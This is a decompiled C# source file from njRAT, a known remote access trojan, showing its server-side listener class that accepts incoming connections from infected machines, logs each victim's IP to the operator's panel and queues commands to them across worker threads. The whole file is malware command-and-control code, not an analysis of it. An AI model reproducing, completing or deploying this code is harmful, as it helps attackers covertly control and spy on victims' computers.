using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT.njRAT
{
	// Token: 0x02000047 RID: 71
	public class SK
	{
		// Token: 0x06000612 RID: 1554 RVA: 0x0014837C File Offset: 0x0014677C
		public SK(int port)
		{
			this.bool_0 = false;
			this.Online = new Collection();
			this.S = new TcpListener(port);
			this.S.Server.SendTimeout = -1;
			this.S.Server.ReceiveTimeout = -1;
			this.S.Server.SendBufferSize = 524288;
			this.S.Server.ReceiveBufferSize = 524288;
			this.S.Start(9999);
			ThreadPool.SetMinThreads(250, 250);
			ThreadPool.SetMaxThreads(250, 250);
			this.Online = new Collection();
			this.REQ = new List<GClass12>();
			int num = 0;
			do
			{
				this.S.BeginAcceptTcpClient(new AsyncCallback(this.accept), null);
				num++;
			}
			while (num <= 10);
			int num2 = 1;
			do
			{
				Thread thread = new Thread(new ParameterizedThreadStart(this.lam__7));
				thread.Start(num2);
				num2++;
			}
			while (num2 <= 16);
		}

		// Token: 0x06000613 RID: 1555 RVA: 0x001484A8 File Offset: 0x001468A8
		private void lam__7(object object_0)
		{
			this.tp(Conversions.ToInteger(RuntimeHelpers.GetObjectValue(object_0)));
		}

		// Token: 0x06000614 RID: 1556 RVA: 0x001484C0 File Offset: 0x001468C0
		public void accept(IAsyncResult ar)
		{
			try
			{
				Client client = new Client(this.S.EndAcceptTcpClient(ar), this);
				client.ClientI.ReceiveTimeout = -1;
				client.ClientI.SendTimeout = -1;
				client.ClientI.SendBufferSize = 524288;
				client.ClientI.ReceiveBufferSize = 524288;
				bool bool_ = Class7.class8_0.bool_2;
				if (bool_)
				{
					Class7.form1_0.Pp1.WRT(new object[]
					{
						Color.Lime,
						Class6.smethod_13(),
						client.COI,
						Color.GreenYellow,
						client.ip(),
						"Connected"
					});
				}
				Collection online = this.Online;
				Collection collection = online;
				lock (collection)
				{
					this.Online.Add(client, client.ip(), null, null);
				}
			}
			catch (Exception ex)
			{
			}
			Thread.Sleep(1);
			this.S.BeginAcceptTcpClient(new AsyncCallback(this.accept), null);
		}

		// Token: 0x06000615 RID: 1557 RVA: 0x00148610 File Offset: 0x00146A10
		public Client GetClient(string ID)
		{
			Collection online = this.Online;
			Client client;
			lock (online)
			{
				try
				{
					client = (Client)this.Online[ID];
				}
				catch (Exception ex)
				{
					client = null;
				}
			}
			return client;
		}

		// Token: 0x06000616 RID: 1558 RVA: 0x00148680 File Offset: 0x00146A80
		public void tp(int i)
		{
			for (;;)
			{
				Thread.Sleep(1);
				GClass12 gclass = null;
				List<GClass12> req = this.REQ;
				List<GClass12> list = req;
				bool flag;
				lock (list)
				{
					flag = this.REQ.Count > 0;
					if (flag)
					{
						gclass = this.REQ[0];
						this.REQ.RemoveAt(0);
					}
				}
				flag = gclass != null;
				if (flag)
				{
					Class7.smethod_5(new object[] { gclass.client_0, gclass.byte_0 });
					gclass.bool_0 = true;
				}
			}
		}

		// Token: 0x04000359 RID: 857
		private bool bool_0;

		// Token: 0x0400035A RID: 858
		public Collection Online;

		// Token: 0x0400035B RID: 859
		public List<GClass12> REQ;

		// Token: 0x0400035C RID: 860
		public TcpListener S;
	}
}
